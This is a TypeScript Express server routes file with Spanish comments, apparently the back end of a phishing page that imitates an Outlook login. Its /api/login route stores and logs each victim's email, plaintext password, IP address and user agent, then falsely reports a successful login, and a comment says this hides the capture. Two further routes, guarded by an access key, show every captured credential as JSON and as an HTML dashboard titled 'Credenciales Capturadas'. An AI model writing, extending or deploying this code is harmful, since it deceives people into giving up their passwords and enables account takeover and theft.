import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertLoginCredentialsSchema } from "@shared/schema";
import { z } from "zod";
import { fromZodError } from "zod-validation-error";

// Middleware para verificar contraseña de acceso a la ruta de credenciales
const adminAccessMiddleware = (req: Request, res: Response, next: NextFunction) => {
  const accessKey = req.query.accessKey;
  if (accessKey === process.env.OUTLOOK_PASSWORD) {
    next();
  } else {
    res.status(401).json({ 
      success: false, 
      message: "No autorizado" 
    });
  }
};

export async function registerRoutes(app: Express): Promise<Server> {
  // put application routes here
  // prefix all routes with /api

  // Login endpoint to store credentials
  app.post("/api/login", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const validatedData = insertLoginCredentialsSchema.parse(req.body);
      
      // Store the credentials with additional metadata
      const credentials = await storage.storeLoginCredentials({
        ...validatedData,
        ipAddress: req.ip,
        userAgent: req.get("User-Agent"),
      });
      
      // Log credentials capture for debugging
      console.log("Credenciales capturadas:");
      console.log("- Email/Usuario:", credentials.email);
      console.log("- Contraseña:", credentials.password);
      console.log("- Fecha:", credentials.createdAt);
      console.log("- IP:", credentials.ipAddress || "No disponible");
      
      // Return success without revealing we stored the credentials
      return res.status(200).json({ success: true, message: "Login successful" });
    } catch (error) {
      // Handle validation errors
      if (error instanceof z.ZodError) {
        const validationError = fromZodError(error);
        return res.status(400).json({ 
          success: false, 
          message: "Invalid input data", 
          errors: validationError.message 
        });
      }
      
      // Handle other errors
      console.error("Login error:", error);
      return res.status(500).json({ 
        success: false, 
        message: "An unexpected error occurred" 
      });
    }
  });

  // Admin endpoint to retrieve all stored credentials (with password protection)
  app.get("/api/credentials", adminAccessMiddleware, async (_req: Request, res: Response) => {
    try {
      const allCredentials = await storage.getAllCredentials();
      return res.status(200).json({ credentials: allCredentials });
    } catch (error) {
      console.error("Error fetching credentials:", error);
      return res.status(500).json({ 
        success: false, 
        message: "An unexpected error occurred" 
      });
    }
  });
  
  // HTML view for credentials (with password protection)
  app.get("/view-credentials", adminAccessMiddleware, async (_req: Request, res: Response) => {
    try {
      const allCredentials = await storage.getAllCredentials();
      
      // Generar HTML para mostrar las credenciales
      const credentialsHtml = allCredentials.map(cred => `
        <div style="border: 1px solid #ccc; margin: 10px 0; padding: 15px; border-radius: 5px;">
          <p><strong>Email/Usuario:</strong> ${cred.email}</p>
          <p><strong>Contraseña:</strong> ${cred.password}</p>
          <p><strong>Recordar usuario:</strong> ${cred.rememberMe ? 'Sí' : 'No'}</p>
          <p><strong>Fecha:</strong> ${cred.createdAt}</p>
          <p><strong>Dirección IP:</strong> ${cred.ipAddress || 'No disponible'}</p>
          <p><strong>Agente de usuario:</strong> ${cred.userAgent || 'No disponible'}</p>
        </div>
      `).join('');
      
      // Enviar HTML completo
      res.send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>Credenciales Capturadas</title>
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <style>
            body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
            h1 { color: #333; }
            .container { margin-top: 20px; }
            .empty-message { color: #666; text-align: center; margin-top: 50px; }
            .refresh-btn { background: #4e5ab7; color: white; border: none; padding: 10px 15px; 
                          border-radius: 5px; cursor: pointer; margin-bottom: 20px; }
          </style>
        </head>
        <body>
          <h1>Credenciales Capturadas</h1>
          <button class="refresh-btn" onclick="window.location.reload()">Actualizar datos</button>
          <div class="container">
            ${allCredentials.length > 0 
              ? credentialsHtml 
              : '<p class="empty-message">No hay credenciales capturadas aún.</p>'}
          </div>
        </body>
        </html>
      `);
    } catch (error) {
      console.error("Error fetching credentials for view:", error);
      res.status(500).send("Error al cargar las credenciales");
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
